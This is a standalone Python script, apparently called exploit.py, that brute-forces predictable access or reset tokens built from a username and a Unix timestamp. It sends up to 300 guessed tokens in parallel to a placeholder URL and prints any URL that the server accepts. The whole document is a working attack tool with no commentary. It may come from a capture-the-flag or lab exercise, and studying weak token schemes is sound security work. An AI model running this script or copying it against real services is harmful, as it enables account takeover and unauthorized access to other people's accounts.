import requests
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed

URL = "url"

def try_token(username, ts):
    token = f"{username}{ts}"
    params = {"token": token}

    full_url = f"{URL}?token={token}"
    print(f"[*] Trying: {full_url}")

    try:
        r = requests.get(URL, params=params, timeout=5)

        if "Invalid or expired token." not in r.text:
            return full_url

    except requests.RequestException:
        pass

    return None


def brute_force(username, start_timestamp):
    candidates = [start_timestamp + i for i in range(-300, 1)]

    with ThreadPoolExecutor(max_workers=30) as executor:
        futures = {
            executor.submit(try_token, username, ts): ts
            for ts in candidates
        }

        for future in as_completed(futures):
            result = future.result()
            if result:
                print(f"\n[+] FOUND VALID URL:\n{result}\n")
                executor.shutdown(cancel_futures=True)
                return result

    print("[-] No valid token found.")
    return None


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python exploit.py <username> <unix_timestamp>")
        sys.exit(1)

    username = sys.argv[1]
    start_timestamp = int(sys.argv[2])

    brute_force(username, start_timestamp)
